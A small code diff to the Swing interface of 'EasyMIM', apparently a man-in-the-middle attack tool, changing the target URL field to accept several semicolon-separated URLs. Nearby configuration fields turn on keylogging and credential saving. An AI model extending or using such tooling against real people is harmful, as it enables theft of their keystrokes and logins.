@@ -7,6 +7,7 @@ import java.awt.event.WindowEvent;
 import java.awt.event.WindowListener;
 import java.net.URL;
 import java.util.ArrayList;
+import java.util.Arrays;
 
 import javax.swing.*;
 import javax.swing.GroupLayout.Alignment;
@@ -148,8 +149,8 @@ public class EasyMIMUI {
 					}
 				}
 				EasyMIMConfig config = new EasyMIMConfig();
-				config.targetURL = new ArrayList<String>();
-				config.targetURL.add(targetURLField.getText());
+				String urls = targetURLField.getText();
+				config.targetURL = new ArrayList<String>(Arrays.asList(urls.split(";")));
 				config.imageURL = urlImageTextField.getText();
 				config.keylogger = isKeyLogging.isEnabled();
 				config.saveCred = isSaveCredential.isEnabled();
